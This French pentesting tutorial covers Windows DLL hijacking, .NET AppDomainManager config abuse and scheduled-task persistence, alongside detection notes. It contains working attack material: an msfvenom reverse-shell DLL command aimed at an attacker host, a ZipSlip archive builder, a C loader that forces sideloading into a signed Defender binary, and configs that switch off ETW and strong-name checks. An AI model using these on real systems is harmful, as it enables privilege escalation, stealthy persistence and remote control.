# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

Le DLL Hijacking consiste à manipuler une application de confiance pour lui faire charger une DLL malveillante. Ce terme englobe plusieurs tactiques, comme le **DLL Spoofing, l'Injection et le Side-Loading**. Il est principalement utilisé pour l'exécution de code et la persistance et, plus rarement, pour l'escalade de privilèges. Bien que l'accent soit mis ici sur l'escalade, la méthode de hijacking reste la même, quels que soient les objectifs.

### Techniques courantes

Plusieurs méthodes sont utilisées pour le DLL Hijacking. Leur efficacité dépend de la stratégie de chargement des DLL de l'application :<sup>[[4]](#references)</sup>

1. **DLL Replacement** : remplacer une DLL authentique par une DLL malveillante, éventuellement en utilisant le DLL Proxying pour préserver les fonctionnalités de la DLL d'origine.
2. **DLL Search Order Hijacking** : placer la DLL malveillante dans un chemin de recherche prioritaire par rapport à la DLL légitime, en exploitant l'ordre de recherche de l'application.
3. **Phantom DLL Hijacking** : créer une DLL malveillante qu'une application chargera en croyant qu'il s'agit d'une DLL requise mais inexistante.
4. **DLL Redirection** : modifier les paramètres de recherche, comme `%PATH%`, ou les fichiers `.exe.manifest` / `.exe.local` afin d'orienter l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : remplacer la DLL légitime par une version malveillante dans le répertoire WinSxS. Cette méthode est souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, selon une approche similaire aux techniques de Binary Proxy Execution.

Une application peut également implémenter son **propre chargeur de DLL**. Un processus privilégié peut énumérer un sous-répertoire, comme `Libraries` ou `Plugins`, et transmettre une DLL choisie à un programme auxiliaire, indépendamment de l'ordre de recherche normal des DLL de Windows. Si un autre compte peut créer des fichiers dans ce répertoire précis, considérez cela comme une piste à examiner : vérifiez l'identité du processus, les ACL effectives du répertoire, la règle de sélection des fichiers et l'existence d'une opération de chargement accessible. Le fait qu'un répertoire inscriptible se trouve à côté d'un exécutable ne prouve pas que le processus y charge des DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Le side-loading classique laisse le PE de confiance intact et détourne la résolution des noms de DLL. L'**Import grafting** modifie plutôt un PE déjà chargé par le programme de confiance. L'attaquant ajoute un descripteur d'importation et les entrées de recherche/IAT associées pour une DLL qu'il contrôle. Lorsque Windows résout cette dépendance de manière récursive, il mappe la DLL ajoutée et exécute son code d'initialisation dans le processus par ailleurs légitime. Il s'agit d'une modification du PE sur disque, et non du remplacement, à l'exécution, d'un pointeur de fonction IAT actif par un hook.<sup>[[31]](#references)[[32]](#references)</sup>

Le PE modifié peut être une DLL intermédiaire du fournisseur plutôt que l'exécutable lancé par l'utilisateur ou le Planificateur de tâches. Voici une chaîne réutilisable :<sup>[[32]](#references)</sup>

1. Copier l'exécutable légitime et ses dépendances dans un répertoire contrôlé par l'attaquant.
2. Modifier les structures d'importation d'une dépendance pour qu'elles référencent la DLL malveillante, tout en conservant les exports attendus et le comportement normal de la dépendance.
3. Configurer un mécanisme d'exécution automatique ou une tâche planifiée pour lancer l'exécutable légitime. Le chargeur mappe la dépendance modifiée, puis la DLL nouvellement importée. Voir [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) pour l'énumération des tâches.
4. Éviter les opérations coûteuses dans `DllMain` ; le chargeur observé a créé un thread de travail et y a poursuivi le déchiffrement par étapes.

Cette méthode diffère d'une compromission de la chaîne d'approvisionnement du fournisseur si son package est sain et que la modification des imports a lieu après l'installation. Lors de l'analyse, examinez tous les modules du répertoire préparé, pas seulement l'EXE hôte : comparez les listes d'importation et les hachages des dépendances avec ceux d'une installation saine, vérifiez les signatures et examinez les binaires du fournisseur lancés depuis des emplacements inscriptibles inattendus, comme `C:\ProgramData`. Une tâche planifiée pointant vers un rapporteur de plantage ou un programme de mise à jour copié dans un tel répertoire constitue une piste particulièrement utile.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + assembly contrôlé par l'attaquant)

Le DLL sideloading classique n'est pas le seul moyen de faire charger du code contrôlé par un attaquant à un processus **.NET Framework** de confiance. Si l'exécutable cible est une application **managée**, le CLR consulte également un **fichier de configuration de l'application** portant le nom de l'exécutable (par exemple `Setup.exe.config`). Ce fichier peut définir un **AppDomainManager** personnalisé. Si la configuration pointe vers un assembly contrôlé par l'attaquant et placé à côté de l'EXE, le CLR le charge **avant le chemin d'exécution normal de l'application** et l'exécute dans le processus de confiance.<sup>[[24]](#references)</sup>

Selon le schéma de configuration .NET Framework de Microsoft, `<appDomainManagerAssembly>` et `<appDomainManagerType>` doivent tous deux être présents pour que le gestionnaire personnalisé soit utilisé.<sup>[[16]](#references)[[17]](#references)</sup>

Configuration minimale :

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestionnaire minimal :

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Practical notes :
- Il s’agit d’une technique propre à **.NET Framework**. Elle repose sur l’analyse de la configuration par le CLR, et non sur l’ordre de recherche des DLL Win32.
- L’hôte doit réellement être un **EXE managé**. Pour un triage rapide : `sigcheck -m target.exe`, `corflags target.exe` ou vérifier la présence de l’en-tête **CLR Runtime Header** dans les métadonnées PE.
- Le nom du fichier de configuration doit correspondre exactement à celui de l’exécutable (`<binary>.config`) et il se trouve généralement **à côté de l’EXE**.
- Cette technique est utile avec des **binaires Microsoft/fournisseur signés**, car l’EXE de confiance reste intact tandis que l’assembly managé malveillant s’exécute dans le processus.
- Si vous disposez déjà d’un répertoire d’installation/de mise à jour modifiable, le AppDomainManager hijacking peut servir de **première étape**, suivie d’un DLL sideloading classique ou d’un chargement réflexif pour les étapes suivantes.

### Type AppDomainManager signé utilisé comme gadget de fichier de configuration

Le détournement AppDomainManager par configuration présenté plus haut pointe généralement vers un assembly contrôlé par l’attaquant. Une autre méthode propre à .NET Framework utilise un **assembly signé**, placé à côté de l’hôte ou résolvable autrement, dont le type de gestionnaire lit des données auxiliaires contrôlées par l’attaquant. Celui-ci doit toujours contrôler le fichier `.exe.config` adjacent de l’hôte managé et les fichiers secondaires ; la signature de l’assembly sélectionné ne rend pas sûre l’entrée de configuration. Le mécanisme de configuration repose sur le comportement établi d’AppDomainManager, tandis que l’enchaînement décrit ci-dessous avec un type signé a été observé lors de l’analyse de NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

Dans cet enchaînement, la configuration sélectionne `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` dans `Microsoft.HostIntegration.Connectors`. Son initialisation recherche `fabric.config` dans le répertoire de l’application. Une entrée `customType` désigne `System.Resources.ResXResourceSet` et fournit `Resources.resx` comme argument de son constructeur, ce qui permet d’atteindre un analyseur de ressources sans fournir de DLL de gestionnaire créée par l’attaquant. Cela nécessite que l’assembly signé lié à AppFabric et les classes du framework indiquées puissent être résolus sur la cible ; ce comportement n’est pas universel à tous les EXE managés.<sup>[[35]](#references)</sup> Un AppDomainManager configuré nécessite également une application en confiance totale ; sinon, le CLR lève une `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Le contenu de `Resources.resx` est le puits de désérialisation, pas simplement un fichier de données ; voir [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). Dans l’étape rapportée, le chargeur XAML dérivait également sa clé AES du hash SHA-256 de la **ligne de commande complète de l’hôte en minuscules** et utilisait les 16 premiers octets du blob décodé comme IV. Rejouer les fichiers avec une ligne de commande différente fait donc échouer le déchiffrement avant le chargement du XAML suivant.<sup>[[35]](#references)</sup>

### AppDomainManager comme téléchargeur et amorçage par tâche planifiée

Un schéma d’intrusion pratique consiste à associer l’EXE .NET de confiance à la fois à un fichier `*.config` malveillant et à une DLL AppDomainManager malveillante qui sert uniquement de **petit bootstrapper** :<sup>[[25]](#references)</sup>

1. L’utilisateur lance un installateur ou un programme de mise à jour .NET signé depuis un emplacement crédible, comme `%USERPROFILE%\Downloads`.
2. Le fichier de configuration adjacent amène le CLR à charger l’assembly de l’attaquant **avant** le démarrage de la logique de l’application légitime.
3. Le gestionnaire malveillant effectue un **contrôle du chemin** (par exemple, ne poursuivre que si l’EXE hôte s’exécute depuis `Downloads`, et n’autoriser l’exécution de la deuxième étape que depuis `%LOCALAPPDATA%`).
4. Si le contrôle réussit, il télécharge la charge utile réelle dans un chemin accessible en écriture par l’utilisateur, comme `%LOCALAPPDATA%\PerfWatson2.exe`, et installe la persistance au moyen d’une tâche planifiée.

Pourquoi cette variante est importante :
- L’EXE hôte signé reste inchangé ; un triage qui ne calcule le hash que du binaire principal peut donc passer à côté de la compromission.
- L’**anti-analyse basée sur le chemin** est courante : déplacer le trio ZIP/EXE/DLL sur le Bureau, dans Temp ou dans un chemin de sandbox peut intentionnellement interrompre la chaîne.
- La DLL AppDomainManager de première étape peut rester minuscule et discrète, tandis que le véritable implant est téléchargé ultérieurement.

Exemple minimal de persistance fréquemment observé avec ce schéma :

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes :
- ` /rl highest` signifie **le niveau le plus élevé disponible** pour cet utilisateur/cette session ; cela ne garantit pas à lui seul une élévation SYSTEM.
- Cette technique est souvent mieux classée comme **exécution/persistance via abus de configuration .NET** que comme un détournement classique de l’ordre de recherche de DLL manquantes, même si les opérateurs associent fréquemment les deux.

Points de détection :
- Des exécutables .NET signés lancés depuis des **répertoires d’extraction ZIP**, `Downloads`, `%TEMP%` ou d’autres dossiers accessibles en écriture par l’utilisateur, avec un fichier `<exe>.config` **dans le même répertoire**.
- De nouvelles tâches planifiées dont l’action pointe vers `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads`, et dont les noms imitent ceux de programmes de mise à jour de navigateurs ou de fournisseurs.
- De courts processus bootstrap gérés qui téléchargent immédiatement un autre EXE, puis lancent `schtasks.exe`.
- Des échantillons qui se terminent prématurément si le chemin de l’exécutable ne correspond pas à un répertoire attendu du profil utilisateur.

### Hijacking an existing scheduled task to relaunch the sideload chain

Pour assurer la persistance, ne cherchez pas uniquement la **création d’une nouvelle tâche**. Certains groupes d’intrusion attendent qu’un installateur légitime crée une **tâche de mise à jour normale**, puis **réécrivent l’action de la tâche** afin que son nom, son auteur et son déclencheur restent familiers aux défenseurs.

Procédure réutilisable :
1. Installez/lancez le logiciel légitime et identifiez la tâche qu’il crée normalement.
2. Exportez le XML de la tâche et notez les valeurs actuelles de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Remplacez uniquement l’action afin que la tâche lance votre **EXE hôte de confiance** depuis un répertoire de staging accessible en écriture par l’utilisateur ; celui-ci charge ensuite le vrai payload par side-loading ou via AppDomain.
4. Réenregistrez la tâche sous le même nom au lieu de créer un nouvel artefact de persistance évident.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Pourquoi c’est plus furtif :
- Le nom de la tâche peut sembler légitime (par exemple, celui d’un outil de mise à jour d’un fournisseur).
- Le **service Task Scheduler** la lance : la validation du processus parent ou ancêtre voit donc souvent la chaîne de planification attendue plutôt que `explorer.exe`.
- Les équipes DFIR qui recherchent uniquement les **nouveaux noms de tâches** peuvent manquer une tâche déjà enregistrée dont l’action pointe désormais vers `%LOCALAPPDATA%`, `%APPDATA%` ou un autre chemin contrôlé par l’attaquant.

Pistes de recherche rapides :
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Comparez le XML de `C:\Windows\System32\Tasks\*` et les métadonnées de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` à une référence.
- Déclenchez une alerte lorsqu’une **tâche de mise à jour qui semble provenir d’un fournisseur** s’exécute depuis des **répertoires accessibles en écriture par l’utilisateur** ou lance un EXE .NET accompagné d’un fichier `*.config`.

> [!TIP]
> Pour découvrir une chaîne détaillée combinant staging HTML, configurations AES-CTR et implants .NET avec du DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Lier un stage side-loadé à la ligne de commande du service

Une DLL side-loadée peut dépendre d’éléments supplémentaires au-delà du nom attendu de l’EXE hôte et de la DLL. Mandiant a décrit un loader qui lie le déchiffrement du payload à un argument de ligne de commande et au nom de son exécutable hôte.<sup>[[33]](#references)</sup> Dans une chaîne ultérieure reposant sur un service, un hôte légitime copié chargeait un `mscoree.dll` voisin, qui exportait `LockClrVersion`, et ne déchiffrait son stage intégré qu’après avoir dérivé une clé AES-128 à partir de l’argument du service et du nom de base de l’exécutable hôte. Chaque entrée était tronquée ou complétée par des NUL jusqu’à 16 octets ; la clé était calculée octet par octet avec `argument XOR embedded_key XOR executable_basename`, puis le payload était déchiffré avec AES-CBC sans padding. Renommer l’hôte ou le lancer sans l’argument attendu modifie la clé et empêche le déchiffrement de ce stage, même si la DLL se charge toujours. Pour reproduire ou analyser cette variante, conservez exactement l’argument de ligne de commande et le nom de base.<sup>[[34]](#references)</sup>

Il s’agit d’un **verrou de payload ajouté au DLL side-loading ordinaire**, et non d’une nouvelle règle d’ordre de recherche des DLL ni, à lui seul, d’un primitive d’escalade de privilèges. Le contexte de sécurité du service détermine le niveau de privilèges obtenu. Le workflow C2 via [GitHub issue/file](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) décrit séparément le transport utilisé par la suite.<sup>[[34]](#references)</sup>

## Trouver les DLL manquantes

La méthode la plus courante pour trouver les DLL manquantes dans un système consiste à exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **définissant** les **2 filtres suivants** :

![Techniques courantes - Trouver les DLL manquantes : la méthode la plus courante pour trouver les DLL manquantes dans un système consiste à exécuter procmon de sysinternals, en définissant les 2 filtres suivants](<../../../images/image (961).png>)

![Techniques courantes - Trouver les DLL manquantes : la méthode la plus courante pour trouver les DLL manquantes dans un système consiste à exécuter procmon de sysinternals, en définissant les 2 filtres suivants](<../../../images/image (230).png>)

et à afficher uniquement la **File System Activity** :

![Techniques courantes - Trouver les DLL manquantes : et afficher uniquement la File System Activity](<../../../images/image (153).png>)

Si vous recherchez des **DLL manquantes en général**, laissez l’outil **tourner** pendant quelques **secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, définissez un autre filtre, par exemple **"Process Name" "contains" `<exec name>`**, exécutez-le, puis arrêtez la capture des événements.<sup>[[9]](#references)</sup>

## Exploiter les DLL manquantes

Pour escalader les privilèges, recherchez une **DLL qu’un processus privilégié tente de charger** depuis un emplacement dans lequel vous pouvez écrire. Cela peut se produire si vous contrôlez un répertoire recherché avant celui qui contient la DLL légitime, ou si la DLL demandée n’existe pas et que vous pouvez écrire dans l’un des répertoires recherchés.

### Ordre de recherche des DLL

**La** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **explique précisément comment les DLL sont chargées.**

Les **applications Windows** recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, dans un ordre particulier. Le DLL hijacking se produit lorsqu’une DLL malveillante est placée stratégiquement dans l’un de ces répertoires afin d’être chargée avant la DLL légitime. Pour éviter cela, l’application doit utiliser des chemins absolus lorsqu’elle fait référence aux DLL dont elle a besoin.

Voici l’**ordre de recherche des DLL sur les systèmes 32 bits** :

1. Le répertoire depuis lequel l’application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16 bits. Aucune fonction ne permet d’obtenir le chemin de ce répertoire, mais il est quand même recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
   1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires répertoriés dans la variable d’environnement PATH. Notez que cela n’inclut pas le chemin propre à l’application spécifié par la clé de registre **App Paths**. La clé **App Paths** n’est pas utilisée lors du calcul du chemin de recherche des DLL.

Il s’agit de l’ordre de recherche **par défaut**, lorsque **SafeDllSearchMode** est activé. Lorsqu’il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (activée par défaut).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, une DLL peut être chargée à partir d’un chemin absolu plutôt que par son nom. Dans ce cas, Windows recherche la DLL uniquement à cet emplacement ; les dépendances demandées par leur nom suivent toujours l’ordre de recherche applicable.

Il existe d’autres façons de modifier l’ordre de recherche, mais je ne vais pas les expliquer ici.

### Enchaîner une écriture arbitraire de fichier à un détournement de DLL manquante

**Technique associée :** [basculement de mount point conditionné par oplock contre une remédiation privilégiée](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Utilisez les filtres **ProcMon** (`Process Name` = EXE cible, `Path` se termine par `.dll`, `Result` = `NAME NOT FOUND`) pour relever les noms de DLL que le processus recherche sans les trouver.<sup>[[14]](#references)</sup>
2. Si le binaire s’exécute selon un **planning ou en tant que service**, déposer une DLL portant l’un de ces noms dans le **répertoire de l’application** (entrée n° 1 de l’ordre de recherche) la fera charger lors de la prochaine exécution. Dans le cas d’un scanner .NET, le processus recherchait `hostfxr.dll` dans `C:\samples\app\` avant de charger la véritable copie depuis `C:\Program Files\dotnet\fxr\...`.
3. Créez une DLL payload (par exemple, un reverse shell) avec n’importe quel export : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si votre primitive est une **écriture arbitraire de type ZipSlip**, créez une archive ZIP dont une entrée sort du répertoire d’extraction pour que la DLL soit déposée dans le dossier de l’application :

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Déposez l’archive dans la boîte de réception/le partage surveillé ; lorsque la tâche planifiée relance le processus, celui-ci charge la DLL malveillante et exécute votre code en tant que compte de service.

### Forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une méthode avancée pour influencer de façon déterministe le chemin de recherche des DLL d’un nouveau processus consiste à définir le champ DllPath de RTL_USER_PROCESS_PARAMETERS lors de la création du processus à l’aide des API natives de ntdll. En fournissant ici un répertoire contrôlé par l’attaquant, il est possible de forcer un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les indicateurs de chargement sécurisé) à charger une DLL malveillante depuis ce répertoire.

Principe clé
- Construisez les paramètres du processus avec RtlCreateProcessParametersEx et fournissez un DllPath personnalisé pointant vers votre dossier contrôlé (par exemple, le répertoire où se trouve votre dropper/unpacker).
- Créez le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par son nom, le chargeur consulte le DllPath fourni lors de la résolution, ce qui permet un sideloading fiable même si la DLL malveillante ne se trouve pas à côté de l’EXE cible.

Remarques et limitations
- Cela affecte le processus enfant en cours de création ; c’est différent de SetDllDirectory, qui affecte uniquement le processus actuel.
- La cible doit importer une DLL par son nom ou la charger avec LoadLibrary (sans chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Les KnownDLLs et les chemins absolus codés en dur ne peuvent pas être détournés. Les exports transférés et SxS peuvent modifier l’ordre de priorité.

Exemple C minimal (ntdll, chaînes larges, gestion des erreurs simplifiée) :

<details>
<summary>Exemple C complet : forcer le sideloading de DLL via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Exemple d’utilisation opérationnelle
- Placez un xmllite.dll malveillant (qui exporte les fonctions requises ou fait proxy vers la version réelle) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par son nom à l’aide de la technique ci-dessus. Le loader résout l’import via le DllPath fourni et effectue le sideloading de votre DLL.

Cette technique a été observée sur le terrain pour mettre en place des chaînes de sideloading à plusieurs étapes : un launcher initial dépose une DLL auxiliaire, qui lance ensuite un binaire signé par Microsoft et vulnérable au hijacking avec un DllPath personnalisé afin de forcer le chargement de la DLL de l’attaquant depuis un répertoire de staging.<sup>[[6]](#references)</sup>


### Hijacking d’AppDomainManager .NET via `.exe.config`

Pour les cibles **.NET Framework**, le sideloading peut être effectué **avant `Main()`** sans patcher la mémoire, en abusant du fichier **`.exe.config`** adjacent à l’application. Au lieu de s’appuyer uniquement sur l’ordre de recherche des DLL Win32, l’attaquant place un EXE .NET légitime à côté d’un fichier de configuration malveillant et d’un ou plusieurs assemblies contrôlés par l’attaquant.

Fonctionnement de la chaîne :<sup>[[15]](#references)[[22]](#references)</sup>
1. L’EXE hôte démarre et le **CLR lit `<exe>.config`**.
2. Le fichier de configuration définit **`<appDomainManagerAssembly>`** et **`<appDomainManagerType>`** afin que le runtime instancie un `AppDomainManager` contrôlé par l’attaquant.
3. Le manager malveillant obtient une **exécution avant `Main()`** dans le processus hôte de confiance.
4. Le même fichier de configuration peut forcer le CLR à résoudre d’abord les assemblies locaux (par exemple `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) et affaiblir la validation du runtime et la télémétrie sans patching inline.

Modèle de type campagne (l’imbrication exacte peut varier selon la directive ou la version du CLR) :

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Pourquoi c’est utile :
- **`<probing privatePath="."/>`** maintient la résolution des assemblies dans le répertoire de l’application, faisant de ce dossier une surface de sideloading prévisible.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** déplacent l’exécution vers le code de l’attaquant pendant l’initialisation du CLR, avant l’exécution de la logique légitime de l’application.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** peut permettre à une application full-trust de charger des assemblies non signés ou modifiés sans échec de validation du strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** évite les redirections de publisher policy vers des assemblies plus récentes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rend la sélection du runtime plus déterministe.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** est particulièrement intéressant, car le **CLR désactive sa propre visibilité ETW** à partir de la configuration, au lieu que l’implant patche `EtwEventWrite` en mémoire.

Schéma opérationnel observé dans des campagnes récentes :
- Étape 1 : dépose `setup.exe`, `setup.exe.config` et des assemblies locales.
- Étape 2 : les copie dans un dossier **AppData de mise à jour** plausible, renomme l’hôte en quelque chose comme `update.exe` et le relance via une **tâche planifiée**.
- Étape 3 : vérifie le contexte d’exécution (par exemple, que le parent attendu est `svchost.exe` lancé par le Planificateur de tâches) avant de charger la DLL/export final du RAT.

Pistes de détection :
- Exécutables **.NET** signés ou autrement légitimes exécutés avec des fichiers **`.config`** adjacents suspects dans des emplacements accessibles en écriture par l’utilisateur.
- Fichiers `.config` contenant **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ou **`etwEnable enabled="false"`**.
- Tâches planifiées qui relancent des binaires de mise à jour renommés depuis **`%LOCALAPPDATA%`** ou des répertoires `\bin\update\` propres à une application.
- Chaînes parent/enfant dans lesquelles une tâche planifiée lance un hôte .NET de confiance qui charge immédiatement des assemblies non fournies par l’éditeur depuis son propre répertoire.

#### Exceptions à l’ordre de recherche des DLL dans la documentation Windows

La documentation Windows signale certaines exceptions à l’ordre de recherche standard des DLL :

- Lorsqu’une **DLL portant le même nom qu’une DLL déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. Il vérifie plutôt s’il existe une redirection et un manifeste avant d’utiliser par défaut la DLL déjà en mémoire. **Dans ce scénario, le système ne recherche pas la DLL**.
- Si la DLL est reconnue comme une **DLL connue** pour la version actuelle de Windows, le système utilise sa version de cette DLL connue, ainsi que ses DLL dépendantes, **sans effectuer de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces DLL connues.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes s’effectue comme si elles étaient indiquées uniquement par leur **nom de module**, que la DLL initiale ait été identifiée ou non à l’aide d’un chemin complet.

### Élévation de privilèges

**Prérequis** :

- Identifier un processus qui s’exécute ou s’exécutera avec des **privilèges différents** (mouvement horizontal ou latéral) et auquel il **manque une DLL**.
